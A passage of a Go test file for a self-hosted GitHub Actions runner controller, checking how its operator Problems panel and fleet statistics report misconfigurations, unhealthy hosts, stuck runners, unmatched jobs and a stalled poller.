package controller

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"
	"unicode"
	"unicode/utf8"

	"github.com/eyupio/zoomies/internal/config"
	"github.com/eyupio/zoomies/internal/cryptox"
	"github.com/eyupio/zoomies/internal/scheduler"
	"github.com/eyupio/zoomies/internal/store"
	"github.com/eyupio/zoomies/internal/updates"
	"github.com/eyupio/zoomies/internal/updates/channel"
	"github.com/eyupio/zoomies/internal/version"
)

// The Overview renders "nothing needs your attention" from an empty list, so
// an instance with nothing wrong must return exactly that -- and an empty
// slice, not nil, because the API marshals it straight to JSON.
func TestProblemsIsEmptyOnACleanInstance(t *testing.T) {
	h := newHarness(t)

	got, err := h.c.Problems(h.ctx)
	if err != nil {
		t.Fatalf("Problems: %v", err)
	}
	if got == nil {
		t.Fatal("Problems returned nil; the UI needs an empty slice to render its quiet state")
	}
	if len(got) != 0 {
		t.Fatalf("a clean instance reported %d problems: %+v", len(got), got)
	}
}

// Every category the panel aggregates, provoked one at a time.
func TestProblemsReportsEachCategory(t *testing.T) {
	t.Run("configuration warning", func(t *testing.T) {
		h := newHarness(t)
		h.cfg.Security.DisableAuth = true
		if !contains(h.problemCodes(), "auth.disabled") {
			t.Fatalf("problems = %v, want the disabled-auth warning", h.problemCodes())
		}
	})

	t.Run("dangerous pool", func(t *testing.T) {
		h := newHarness(t)
		inst := h.installation()
		p := h.pool(inst, "risky")
		p.DockerMode = store.DockerHostSocket
		p.Ephemeral = false
		if err := h.st.UpdatePool(h.ctx, p); err != nil {
			t.Fatalf("UpdatePool: %v", err)
		}
		if !contains(h.problemCodes(), "pool.dangerous") {
			t.Fatalf("problems = %v, want the dangerous-pool warning", h.problemCodes())
		}
	})

	t.Run("repository cache under an organisation installation", func(t *testing.T) {
		h := newHarness(t)
		inst := h.installation()
		p := h.pool(inst, "widgets")
		p.Cache = store.CacheConfig{Enabled: true, Scope: store.CacheScopeRepository, Repository: "acme/widgets"}
		if err := h.st.UpdatePool(h.ctx, p); err != nil {
			t.Fatalf("UpdatePool: %v", err)
		}
		if !contains(h.problemCodes(), "pool.cache_shared") {
			t.Fatalf("problems = %v, want the shared-cache warning", h.problemCodes())
		}
	})

	t.Run("unusable installation", func(t *testing.T) {
		h := newHarness(t)
		inst := h.installation()
		if err := h.st.SetInstallationHealth(h.ctx, inst.ID, "the App is not installed on acme"); err != nil {
			t.Fatalf("SetInstallationHealth: %v", err)
		}
		ps, err := h.c.Problems(h.ctx)
		if err != nil {
			t.Fatalf("Problems: %v", err)
		}
		found := false
		for _, p := range ps {
			if p.Code == "installation.unhealthy" {
				found = true
				if p.Severity != config.SeverityError {
					t.Fatalf("severity = %q, want error", p.Severity)
				}
				if p.Detail != "the App is not installed on acme" {
					t.Fatalf("detail = %q, want the probe's own message", p.Detail)
				}
			}
		}
		if !found {
			t.Fatalf("problems = %+v, want one about the installation", ps)
		}
	})

	t.Run("rejected webhooks", func(t *testing.T) {
		h := newHarness(t)
		h.fleet()
		h.deliver("workflow_job", jobEvent{Action: "queued", JobID: 1}.body(), "wrong")
		if !contains(h.problemCodes(), "webhook.rejected") {
			t.Fatalf("problems = %v, want the rejected-delivery warning", h.problemCodes())
		}
	})

	t.Run("no webhook has ever arrived", func(t *testing.T) {
		h := newHarness(t)
		h.installation()
		if !contains(h.problemCodes(), "webhook.never_received") {
			t.Fatalf("problems = %v, want the polling-only warning", h.problemCodes())
		}
	})

	t.Run("cordoned host with queued work", func(t *testing.T) {
		h := newHarness(t)
		_, _, host := h.fleet()
		if err := h.st.SetHostCordoned(h.ctx, host.ID, true); err != nil {
			t.Fatalf("SetHostCordoned: %v", err)
		}
		h.deliverJob(jobEvent{Action: "queued", JobID: 2, Labels: []string{"self-hosted", "linux", "x64", "demo"}})
		if !contains(h.problemCodes(), "host.cordoned_with_work") {
			t.Fatalf("problems = %v, want the cordoned-host warning", h.problemCodes())
		}
	})

	t.Run("failed runners", func(t *testing.T) {
		h := newHarness(t)
		_, pool, host := h.fleet()
		r := h.runnerRow(pool, host, store.RunnerProvisioning)
		if _, err := h.st.TransitionRunner(h.ctx, r.ID, store.RunnerFailed, "the image could not be pulled"); err != nil {
			t.Fatalf("TransitionRunner: %v", err)
		}
		if !contains(h.problemCodes(), "runners.failed") {
			t.Fatalf("problems = %v, want the failed-runner warning", h.problemCodes())
		}
	})
}

// A job whose labels no pool here advertises is not going to run here, and
// once it has waited long enough to mean something, saying so is the only way
// an operator finds out.
func TestUnmatchedJobIsRecordedAndReported(t *testing.T) {
	h := newHarness(t)
	h.fleet()

	h.deliverJob(jobEvent{
		Action: "queued", JobID: 909,
		Labels:   []string{"self-hosted", "linux", "gpu", "cuda12"},
		QueuedAt: time.Now().Add(-unmatchedGrace - time.Minute),
	})

	job, err := h.st.GetJobByGitHubID(h.ctx, 909)
	if err != nil {
		t.Fatalf("GetJobByGitHubID: %v", err)
	}
	if job.Matched || job.PoolID != "" {
		t.Fatalf("job = %+v, want it recorded as unmatched", job)
	}

	// Before any reconcile, the flag on the row is what answers.
	if !contains(h.problemCodes(), "jobs.unmatched") {
		t.Fatalf("problems = %v, want the unmatched-job warning", h.problemCodes())
	}

	// And after one, the scheduler's own Unmatched list does.
	if err := h.c.Reconcile(h.ctx); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	if !contains(h.problemCodes(), "jobs.unmatched") {
		t.Fatalf("problems after a reconcile = %v, want the unmatched-job warning", h.problemCodes())
	}
	if rs := h.runners(); len(rs) != 0 {
		t.Fatalf("created %d runners for a job no pool claims", len(rs))
	}
}

// Errors come first: an operator scanning the panel should meet the things
// that are broken before the things that are merely risky.
func TestProblemsAreSortedErrorsFirst(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	p := h.pool(inst, "risky")
	p.DockerMode = store.DockerHostSocket
	if err := h.st.UpdatePool(h.ctx, p); err != nil {
		t.Fatalf("UpdatePool: %v", err)
	}
	if err := h.st.SetInstallationHealth(h.ctx, inst.ID, "credentials rejected"); err != nil {
		t.Fatalf("SetInstallationHealth: %v", err)
	}

	ps, err := h.c.Problems(h.ctx)
	if err != nil {
		t.Fatalf("Problems: %v", err)
	}
	if len(ps) < 2 {
		t.Fatalf("problems = %+v, want at least two", ps)
	}
	if ps[0].Severity != config.SeverityError {
		t.Fatalf("first problem is %q, want the error", ps[0].Severity)
	}
	seenWarning := false
	for _, p := range ps {
		if p.Severity == config.SeverityWarning {
			seenWarning = true
		} else if p.Severity == config.SeverityError && seenWarning {
			t.Fatalf("an error appears after a warning: %+v", ps)
		}
	}
}

// Stats is what the Overview's cards are built from.
func TestStatsSummarisesTheFleet(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()
	h.runnerRow(pool, host, store.RunnerBusy)
	h.runnerRow(pool, host, store.RunnerIdle)
	h.deliverJob(jobEvent{Action: "queued", JobID: 11, Labels: []string{"self-hosted", "linux", "x64", "demo"}})

	s, err := h.c.Stats(h.ctx, time.Hour)
	if err != nil {
		t.Fatalf("Stats: %v", err)
	}
	if s.QueuedJobs != 1 {
		t.Fatalf("queued jobs = %d, want 1", s.QueuedJobs)
	}
	if s.Runners.Busy != 1 || s.Runners.Idle != 1 || s.Runners.Total != 2 {
		t.Fatalf("runner counts = %+v, want one busy and one idle", s.Runners)
	}
	if s.Hosts.Total != 1 || s.Hosts.Healthy != 1 || s.Hosts.Capacity != 4 || s.Hosts.Used != 2 {
		t.Fatalf("host counts = %+v, want one healthy host with 4 slots and 2 used", s.Hosts)
	}
	if len(s.Pools) != 1 || s.Pools[0].Queued != 1 || s.Pools[0].Live != 2 {
		t.Fatalf("pool stats = %+v, want one pool with one queued job and two live runners", s.Pools)
	}
	if s.Pools[0].Utilisation != 0.5 {
		t.Fatalf("utilisation = %v, want 0.5", s.Pools[0].Utilisation)
	}
}

// "Used of capacity" is a utilisation ratio, so both halves have to cover the
// same hosts. Capacity leaves out a cordoned or silent host, and its runners
// used to be counted in "used" all the same: a fleet with a host draining for
// maintenance read as full (or over full) while the healthy host beside it
// sat free, in exactly the moment an operator was asking why a queue was not
// draining.
func TestSlotsUsedAreCountedOnTheHostsCapacityCounts(t *testing.T) {
	h := newHarness(t)
	_, pool, healthy := h.fleet()
	h.runnerRow(pool, healthy, store.RunnerBusy)

	cordoned := h.host("vm-cordoned")
	for i := 0; i < 3; i++ {
		h.runnerRow(pool, cordoned, store.RunnerBusy)
	}
	if err := h.st.SetHostCordoned(h.ctx, cordoned.ID, true); err != nil {
		t.Fatalf("SetHostCordoned: %v", err)
	}

	silent := h.host("vm-silent")
	h.runnerRow(pool, silent, store.RunnerIdle)
	silent.LastHeartbeat = time.Now().Add(-2 * store.HeartbeatTimeout)
	if err := h.st.UpdateHost(h.ctx, silent); err != nil {
		t.Fatalf("UpdateHost: %v", err)
	}

	s, err := h.c.Stats(h.ctx, time.Hour)
	if err != nil {
		t.Fatalf("Stats: %v", err)
	}
	if s.Hosts.Capacity != 4 || s.Hosts.Used != 1 {
		t.Errorf("stats say %d of %d slots used, want 1 of 4: only the healthy, uncordoned host counts", s.Hosts.Used, s.Hosts.Capacity)
	}
	// The runners themselves are all still there to be counted elsewhere.
	if s.Runners.Total != 5 {
		t.Errorf("runners total = %d, want all 5 live runners", s.Runners.Total)
	}
	for name, want := range map[string]float64{
		"zoomies_host_effective_capacity": 4,
		"zoomies_host_capacity_used":      1,
	} {
		if got, ok := gatherValue(t, h.c, name, nil); !ok || got != want {
			t.Errorf("%s = %v (%v), want %v", name, got, ok, want)
		}
	}
}

// A pool nothing can run is the failure that looks like health: the pool is
// enabled, the job matched it, every host is connected, and no runner is ever
// created. Nothing else in the product reports it -- a scaling event is written
// only when the size actually moved -- so the panel has to.
func TestPoolWithNoHostToRunItIsReported(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	p := h.pool(inst, "linux-x64")
	p.Backend = store.BackendPodman
	if err := h.st.UpdatePool(h.ctx, p); err != nil {
		t.Fatalf("UpdatePool: %v", err)
	}
	// One connected, healthy host -- which offers docker, not podman.
	host := h.host("vm-1")
	host.BackendInfo = store.HostBackends{{
		Kind: store.BackendPodman, Available: false,
		Detail: "podman.sock is not readable by this agent",
	}}
	if err := h.st.UpdateHost(h.ctx, host); err != nil {
		t.Fatalf("UpdateHost: %v", err)
	}
	h.deliverJob(jobEvent{Action: "queued", JobID: 4242, Labels: p.Labels})

	if err := h.c.Reconcile(h.ctx); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	if rs := h.runners(); len(rs) != 0 {
		t.Fatalf("created %d runners with no host able to run them", len(rs))
	}

	ps, err := h.c.Problems(h.ctx)
	if err != nil {
		t.Fatalf("Problems: %v", err)
	}
	var found *Problem
	for i, p := range ps {
		if p.Code == "pool.no_capacity" {
			found = &ps[i]
		}
	}
	if found == nil {
		t.Fatalf("problems = %v, want one saying the pool has nowhere to run", h.problemCodes())
	}
	// A queued job makes this an outage, not a warning about a pool that
	// merely cannot reach its minimum.
	if found.Severity != config.SeverityError {
		t.Fatalf("severity = %q, want error while a job is waiting", found.Severity)
	}
	if !strings.Contains(found.Detail, "podman") {
		t.Fatalf("detail = %q, want it to name the backend no host offers", found.Detail)
	}
	// The agent's own explanation is the whole fix, so it must survive the
	// trip from the probe to the panel.
	if !strings.Contains(found.Detail, "podman.sock is not readable") {
		t.Fatalf("detail = %q, want the host's own explanation", found.Detail)
	}
	if found.Fix == "" || found.TargetID != p.ID {
		t.Fatalf("problem = %+v, want a fix and a link to the pool", found)
	}
	// "point this pool at a backend they already offer" is only a fix if the
	// panel says which one, and hands the UI enough to make the change.
	if !slices.Contains(found.Alternatives, string(store.BackendDocker)) {
		t.Fatalf("alternatives = %v, want the docker backend this host does offer", found.Alternatives)
	}
	if !strings.Contains(found.Fix, "docker") {
		t.Fatalf("fix = %q, want it to name the backend to switch to", found.Fix)
	}
}

func TestRepositoryScaleUpDeferralIsAccurateInProblemsDrawer(t *testing.T) {
	h := newHarness(t)
	h.c.setLastPlan(scheduler.Plan{Pools: []scheduler.PoolPlan{{
		PoolID: "pool_shared", PoolName: "shared", QueuedMatched: 3,
		QuotaDeferredJobs: 2, QuotaDeferredRepositories: []string{"acme/api", "acme/web"},
	}}})

	ps := h.c.PoolCapacityProblems()
	if len(ps) != 1 || ps[0].Code != "pool.repository_scale_up_deferred" {
		t.Fatalf("problems = %+v, want one scale-up deferral", ps)
	}
	if ps[0].Severity != config.SeverityWarning || !strings.Contains(ps[0].Detail, "Compatible idle runners may still accept") {
		t.Fatalf("problem = %+v, want best-effort GitHub assignment caveat", ps[0])
	}
	if !strings.Contains(ps[0].Detail, "acme/api, acme/web") || !strings.Contains(ps[0].Fix, "repository-specific pools") {
		t.Fatalf("problem = %+v, want affected repositories and strict-isolation guidance", ps[0])
	}
}

// The same pool, once a host can run it, drops off the panel: a problem that
// never clears is one an operator learns to ignore.
func TestPoolProblemClearsWhenAHostCanRunIt(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	p := h.pool(inst, "linux-x64")
	h.deliverJob(jobEvent{Action: "queued", JobID: 4243, Labels: p.Labels})

	if err := h.c.Reconcile(h.ctx); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	if !contains(h.problemCodes(), "pool.no_capacity") {
		t.Fatalf("problems = %v, want the blocked pool with no hosts at all", h.problemCodes())
	}

	h.host("vm-1")
	if err := h.c.Reconcile(h.ctx); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	if contains(h.problemCodes(), "pool.no_capacity") {
		t.Fatalf("problems = %v, want the blocked pool gone once a host can run it", h.problemCodes())
	}
}

// A fleet that is simply full is the system working: the jobs are waiting for a
// runner to finish, not for an operator. It is still worth saying, but it is
// not an outage.
func TestAFullFleetIsAWarningRatherThanAnOutage(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	p := h.pool(inst, "linux-x64")
	host := h.host("vm-1")
	host.Capacity = 1
	if err := h.st.UpdateHost(h.ctx, host); err != nil {
		t.Fatalf("UpdateHost: %v", err)
	}
	// The one slot is taken, and a second job is queued behind it.
	h.runnerRow(p, host, store.RunnerBusy)
	h.deliverJob(jobEvent{Action: "queued", JobID: 4244, Labels: p.Labels})

	if err := h.c.Reconcile(h.ctx); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	ps, err := h.c.Problems(h.ctx)
	if err != nil {
		t.Fatalf("Problems: %v", err)
	}
	found := false
	for _, pr := range ps {
		if pr.Code != "pool.no_capacity" {
			continue
		}
		found = true
		if pr.Severity != config.SeverityWarning {
			t.Errorf("severity = %q, want a warning: the fleet is busy, not broken", pr.Severity)
		}
		if !strings.Contains(pr.Detail, "at capacity") {
			t.Errorf("detail = %q, want it to say the fleet is full", pr.Detail)
		}
	}
	if !found {
		t.Fatalf("problems = %v, want the pool waiting on capacity", h.problemCodes())
	}
}

// The installation's webhooks cover every job in its repositories, most of
// which this fleet never touches. A job on GitHub's own runners is theirs to
// run however long it queues, and a job no pool here claims may be another
// provider's, about to start there; neither is a problem for this fleet, and
// the dev instance once showed fifty of them as jobs that would never run.
func TestAHostedOrFreshUnmatchedJobIsNotAProblem(t *testing.T) {
	h := newHarness(t)
	h.fleet()

	h.deliverJob(jobEvent{
		Action: "queued", JobID: 910,
		Labels:   []string{"ubuntu-latest"},
		QueuedAt: time.Now().Add(-time.Hour),
	})
	h.deliverJob(jobEvent{
		Action: "queued", JobID: 911,
		Labels:   []string{"blacksmith-4vcpu-ubuntu-2404"},
		QueuedAt: time.Now().Add(-time.Hour),
	})
	h.deliverJob(jobEvent{
		Action: "queued", JobID: 912,
		Labels: []string{"self-hosted", "arc-runner-set"},
		// Fresh: another provider's scale-up delay has not run out.
	})
	if err := h.c.Reconcile(h.ctx); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	if contains(h.problemCodes(), "jobs.unmatched") {
		t.Fatalf("problems = %v; hosted and freshly queued jobs are not this fleet's", h.problemCodes())
	}

	// The view says which jobs are hosted, so the UI can badge them rather
	// than warn about them.
	hosted, err := h.st.GetJobByGitHubID(h.ctx, 910)
	if err != nil {
		t.Fatal(err)
	}
	if v := NewJobView(hosted, ""); !v.Hosted || v.Matched {
		t.Fatalf("view = %+v, want hosted and unmatched", v)
	}
	own, err := h.st.GetJobByGitHubID(h.ctx, 912)
	if err != nil {
		t.Fatal(err)
	}
	if v := NewJobView(own, ""); v.Hosted {
		t.Fatalf("a self-hosted label counted as hosted: %+v", v)
	}
}

// A cordoned host used to be blamed for every queued job in the fleet, pools it
// never offered included, which sent an operator to uncordon a machine that
// would have changed nothing.
func TestACordonedHostIsOnlyBlamedForWorkItCouldRun(t *testing.T) {
	h := newHarness(t)
	inst, _, host := h.fleet()
	if err := h.st.SetHostCordoned(h.ctx, host.ID, true); err != nil {
		t.Fatalf("SetHostCordoned: %v", err)
	}
	// A pool this host never offered: it runs bare processes, and the host's
	// agent speaks Docker.
	bare := h.pool(inst, "bare", "self-hosted", "bare")
	bare.Backend = store.BackendProcess
	if err := h.st.UpdatePool(h.ctx, bare); err != nil {
		t.Fatalf("UpdatePool: %v", err)
	}
	h.deliverJob(jobEvent{Action: "queued", JobID: 3, Labels: []string{"self-hosted", "bare"}})
	if contains(h.problemCodes(), "host.cordoned_with_work") {
		t.Fatalf("problems = %v; the queued job is for a backend this host does not offer", h.problemCodes())
	}

	h.deliverJob(jobEvent{Action: "queued", JobID: 4, Labels: []string{"self-hosted", "linux", "x64", "demo"}})
	if !contains(h.problemCodes(), "host.cordoned_with_work") {
		t.Fatalf("problems = %v, want the cordoned-host warning for a job it could run", h.problemCodes())
	}
}

// Platform is a promise about the machine, separate from a host selector: an
// arm64 pool with no selector is not excluded by the label match, but the
// scheduler will never place it on an amd64 host. Blaming the cordon for that
// queue sends an operator to uncordon a machine that would change nothing.
func TestACordonedHostIsNotBlamedForWorkOfAnotherPlatform(t *testing.T) {
	h := newHarness(t)
	inst, _, host := h.fleet()
	if err := h.st.SetHostCordoned(h.ctx, host.ID, true); err != nil {
		t.Fatalf("SetHostCordoned: %v", err)
	}
	arm := h.pool(inst, "arm", "self-hosted", "arm64")
	arm.Platform = store.Platform{Arch: "arm64"}
	if err := h.st.UpdatePool(h.ctx, arm); err != nil {
		t.Fatalf("UpdatePool: %v", err)
	}
	h.deliverJob(jobEvent{Action: "queued", JobID: 5, Labels: []string{"self-hosted", "arm64"}})
	if contains(h.problemCodes(), "host.cordoned_with_work") {
		t.Fatalf("problems = %v; the queued job is for an architecture this host is not", h.problemCodes())
	}
}

// The failed-runner count came from a page of at most a hundred rows, so a
// fleet having a bad day was told it had a hundred failures however many it had.
func TestTheFailedRunnerCountIsNotAPage(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()
	const failed = 120
	for i := 0; i < failed; i++ {
		r := h.runnerRow(pool, host, store.RunnerProvisioning)
		if _, err := h.st.TransitionRunner(h.ctx, r.ID, store.RunnerFailed, "the image could not be pulled"); err != nil {
			t.Fatalf("TransitionRunner: %v", err)
		}
	}
	ps, err := h.c.Problems(h.ctx)
	if err != nil {
		t.Fatalf("Problems: %v", err)
	}
	for _, p := range ps {
		if p.Code == "runners.failed" {
			if want := "120 runners in the failed state"; p.Title != want {
				t.Fatalf("title = %q, want %q", p.Title, want)
			}
			return
		}
	}
	t.Fatalf("problems = %v, want runners.failed", ps)
}

// findProblem returns the problem with a code, or fails saying what was there.
func findProblem(t *testing.T, h *harness, code string) Problem {
	t.Helper()
	ps, err := h.c.Problems(h.ctx)
	if err != nil {
		t.Fatalf("Problems: %v", err)
	}
	for _, p := range ps {
		if p.Code == code {
			return p
		}
	}
	t.Fatalf("problems = %v, want %s", codesOf(ps), code)
	return Problem{}
}

// stuck is a moment past the threshold that reports a runner as not
// progressing -- half the provision timeout -- and before the timeout itself
// would fail it, which is the window these problems exist to fill. It is
// derived rather than written down: the threshold follows a setting, and a test
// that pinned the minutes would have to be edited every time that setting moved
// rather than failing only when the behaviour did.
func (h *harness) stuck(from time.Time) time.Time {
	return from.Add(h.cfg.Scheduler.ProvisionTimeout * 3 / 4)
}

// A runner that is still starting up normally must not raise anything. This is
// the expensive half of the behaviour to get wrong: a warning that appears
// every time a pool creates a runner is a warning nobody reads by the end of
// the week.
func TestARunnerThatIsStillComingUpIsNotAProblem(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()
	h.runnerRow(pool, host, store.RunnerRegistering)

	if got := h.problemCodes(); contains(got, "runners.not_progressing") {
		t.Fatalf("problems = %v, want nothing about a runner that was created a moment ago", got)
	}
}

// The distinction this problem exists to make: a container that started and a
// runner that has not registered is the runner process failing to reach GitHub,
// and the fix says to read that runner's own logs.
func TestARunnerWhoseContainerStartedButNeverRegisteredNamesItsOwnLogs(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()

	started := time.Now()
	r := h.runnerRow(pool, host, store.RunnerRegistering)
	if err := h.st.SetRunnerStartup(h.ctx, r.ID, nil, &started); err != nil {
		t.Fatalf("SetRunnerStartup: %v", err)
	}
	// Past half the provision timeout, but not yet past the timeout itself:
	// the whole point is to say something while there is still time to look.
	h.c.clock = func() time.Time { return h.stuck(started) }

	p := findProblem(t, h, "runners.not_progressing")
	if !strings.Contains(p.Fix, "has not registered") || !strings.Contains(p.Fix, "github.com") {
		t.Fatalf("fix = %q, want the runner-side causes", p.Fix)
	}
	if !strings.Contains(p.Detail, r.Name) {
		t.Fatalf("detail = %q, want the runner named", p.Detail)
	}
	if p.TargetID != r.ID || p.TargetKind != "runner" {
		t.Fatalf("target = %s/%s, want the runner itself", p.TargetKind, p.TargetID)
	}
}

// The other shape, and the reason one code is not enough on its own: nothing
// has reported a workload at all, which is a problem on the host rather than
// inside the runner.
func TestARunnerWithNoContainerYetPointsAtTheHost(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()
	r := h.runnerRow(pool, host, store.RunnerProvisioning)

	h.c.clock = func() time.Time { return h.stuck(r.CreatedAt) }

	p := findProblem(t, h, "runners.not_progressing")
	if !strings.Contains(p.Fix, "agent log") || !strings.Contains(p.Fix, "image") {
		t.Fatalf("fix = %q, want the host-side causes", p.Fix)
	}
	if !strings.Contains(p.Detail, host.Name) {
		t.Fatalf("detail = %q, want the host named when they are all on one", p.Detail)
	}
}

// The threshold is half the provision timeout rather than a number of its own,
// so an operator who allows longer for a slow image pull is not then told their
// runners are stuck while they are still within the time they allowed.
func TestTheStuckThresholdFollowsTheProvisionTimeout(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()
	r := h.runnerRow(pool, host, store.RunnerRegistering)
	h.c.clock = func() time.Time { return r.CreatedAt.Add(6 * time.Minute) }

	h.cfg.Scheduler.ProvisionTimeout = 10 * time.Minute
	if got := h.problemCodes(); !contains(got, "runners.not_progressing") {
		t.Fatalf("problems = %v, want a ten-minute timeout to have raised it by six", got)
	}

	h.cfg.Scheduler.ProvisionTimeout = time.Hour
	if got := h.problemCodes(); contains(got, "runners.not_progressing") {
		t.Fatalf("problems = %v, want silence six minutes into an hour's allowance", got)
	}

	// Off means off: a fleet that has switched the timeout off has said that
	// runners may take as long as they take.
	h.cfg.Scheduler.ProvisionTimeout = 0
	h.c.clock = func() time.Time { return r.CreatedAt.Add(24 * time.Hour) }
	if got := h.problemCodes(); contains(got, "runners.not_progressing") {
		t.Fatalf("problems = %v, want nothing when provision_timeout is off", got)
	}
}

// The detail names one runner and the fix tells you what to do about it, so on
// a mixed fleet the two must describe the same runner. They used to be chosen
// separately -- the example was the oldest, the fix was whichever shape there
// were more of -- so an even split named a runner with no container and then
// told the operator to go and read that container's logs.
func TestTheFixDescribesTheRunnerTheDetailNames(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()

	// Oldest first and still waiting for a container, then a younger one whose
	// container started: one of each, so no bucket is the larger.
	waiting := h.runnerRow(pool, host, store.RunnerProvisioning)
	started := h.runnerRow(pool, host, store.RunnerRegistering)
	// The younger one's clock starts a second after the older one's, not at
	// the wall clock: the two rows are written within a millisecond of each
	// other, and a container stamped with the same millisecond as the other
	// runner's creation is not younger by anyone's clock.
	at := waiting.CreatedAt.Add(time.Second)
	if err := h.st.SetRunnerStartup(h.ctx, started.ID, nil, &at); err != nil {
		t.Fatalf("SetRunnerStartup: %v", err)
	}
	h.c.clock = func() time.Time { return h.stuck(waiting.CreatedAt) }

	p := findProblem(t, h, "runners.not_progressing")
	if !strings.Contains(p.Detail, waiting.Name) {
		t.Fatalf("detail = %q, want the oldest runner %s", p.Detail, waiting.Name)
	}
	if !strings.Contains(p.Fix, "agent log") {
		t.Fatalf("fix = %q, want the host-side fix that matches a runner with no container", p.Fix)
	}
	if !strings.Contains(p.Detail, "1 runner waiting for a container") {
		t.Fatalf("detail = %q, want both counts named", p.Detail)
	}
}

// Runners created in one scheduler pass share a millisecond, and the problem
// used to pick whichever the store returned first, so the same fleet could be
// described two ways on two passes. A tie names the runner with no container,
// whichever order the rows come back in.
func TestAStuckTieNamesTheRunnerWithNoContainer(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()

	started := h.runnerRow(pool, host, store.RunnerRegistering)
	waiting := h.runnerRow(pool, host, store.RunnerProvisioning)
	// The container came up at the exact moment the other runner was created.
	at := waiting.CreatedAt
	if err := h.st.SetRunnerStartup(h.ctx, started.ID, nil, &at); err != nil {
		t.Fatalf("SetRunnerStartup: %v", err)
	}
	h.c.clock = func() time.Time { return h.stuck(waiting.CreatedAt) }

	for i := 0; i < 5; i++ {
		p := findProblem(t, h, "runners.not_progressing")
		if !strings.Contains(p.Detail, waiting.Name) {
			t.Fatalf("pass %d: detail = %q, want the runner with no container, %s", i, p.Detail, waiting.Name)
		}
		if !strings.Contains(p.Fix, "agent log") {
			t.Fatalf("pass %d: fix = %q, want the host-side fix", i, p.Fix)
		}
	}
}

// The drawer is read at the moment something is wrong, so the one thing it
// must never do is come back empty because it could not look. It used to
// return a 500 for any single failing query, and a drawer that will not load
// is indistinguishable from a fleet with nothing wrong.
//
// A cancelled context fails every store query at once, which is the strongest
// version of the case: the sections that need the database are all lost, the
// ones that do not are still there, and the list says out loud that it is
// incomplete.
func TestProblemsSurvivesASectionItCannotGather(t *testing.T) {
	h := newHarness(t)
	h.cfg.Security.DisableAuth = true

	ctx, cancel := context.WithCancel(h.ctx)
	cancel()

	got, err := h.c.Problems(ctx)
	if err != nil {
		t.Fatalf("Problems returned an error rather than what it could gather: %v", err)
	}
	codes := make([]string, 0, len(got))
	for _, p := range got {
		codes = append(codes, p.Code)
	}
	// What does not need the database is still reported.
	if !slices.Contains(codes, "auth.disabled") {
		t.Errorf("a configuration warning was lost with the database sections: %v", codes)
	}
	// And the operator is told the list is short, rather than being left to
	// read it as a clean fleet.
	i := slices.Index(codes, "controller.problems_partial")
	if i < 0 {
		t.Fatalf("an incomplete list did not say so: %v", codes)
	}
	if got[i].Severity != config.SeverityError {
		t.Errorf("the incomplete-list entry is %q; a list that cannot be trusted is an error", got[i].Severity)
	}
	// Naming the sections is what makes it actionable rather than alarming.
	for _, section := range []string{"hosts", "jobs", "runners"} {
		if !strings.Contains(got[i].Detail, section) {
			t.Errorf("the detail does not name the %s section: %q", section, got[i].Detail)
		}
	}
}

// The fallback poller is the safety net for a fleet whose webhooks have stopped
// arriving, and both of its failure modes are silent by construction: a sweep
// that has stopped happening looks exactly like a sweep with nothing to find.
// Until now both were visible only in the log, and nobody reads the log of a
// fleet that appears to be fine.
func TestTheProblemsListSaysWhenThePollerHasStoppedSweeping(t *testing.T) {
	h := newHarness(t)
	h.cfg.GitHub.PollFallback = true
	h.cfg.GitHub.PollInterval = 30 * time.Second

	// A poller that has never swept says nothing: a controller that started
	// ten seconds ago is not a controller with a broken poller.
	if contains(h.problemCodes(), "poller.stale") {
		t.Fatalf("a controller that has not polled yet reported a stale poller: %v", h.problemCodes())
	}

	h.c.lastPollAt.Store(h.c.Now().UnixNano())
	if contains(h.problemCodes(), "poller.stale") {
		t.Fatalf("a poller that has just swept was called stale: %v", h.problemCodes())
	}

	// One missed tick is a slow query, not a fault, so the grace is more than
	// one interval and the entry must not fire inside it.
	h.advance(45 * time.Second)
	if contains(h.problemCodes(), "poller.stale") {
		t.Errorf("one missed tick was reported as a stopped poller: %v", h.problemCodes())
	}

	h.advance(2 * time.Minute)
	got := h.problem(t, "poller.stale")
	if got.Severity != config.SeverityWarning {
		t.Errorf("severity = %q, want a warning", got.Severity)
	}
	if !strings.Contains(got.Detail, "webhook") {
		t.Errorf("the detail does not say what is lost while it is stopped: %q", got.Detail)
	}

	// Off is a choice the configuration validator already names, and saying it
	// twice would be the drawer disagreeing with itself.
	h.cfg.GitHub.PollFallback = false
	if contains(h.problemCodes(), "poller.stale") {
		t.Errorf("a deliberately disabled poller was reported as broken: %v", h.problemCodes())
	}
}

// GitHub's quota is per installation, so a hold on one is not a fleet-wide
// fault -- and an operator told "the poller is paused" would go looking for
// one. ZF-101 made the hold per installation; this is the entry catching up
// with it.
func TestARateLimitedInstallationIsNamedRatherThanTheWholePoller(t *testing.T) {
	h := newHarness(t)
	h.cfg.GitHub.PollFallback = true
	inst := h.installation()

	until := h.c.Now().Add(20 * time.Minute)
	h.c.holdGitHub(inst.ID, until)

	got := h.problem(t, "poller.paused")
	if got.TargetKind != "installation" || got.TargetID != inst.ID {
		t.Errorf("the entry does not point at the installation being held: %+v", got)
	}
	// The organisation, not the opaque identifier: an operator recognises one
	// of those.
	if !strings.Contains(got.Title, "acme") {
		t.Errorf("the title does not name the installation an operator would recognise: %q", got.Title)
	}
	if !strings.Contains(got.Detail, until.UTC().Format(time.RFC3339)) {
		t.Errorf("the detail does not say when it clears: %q", got.Detail)
	}

	// It clears itself, and the entry has to go with it or an operator is left
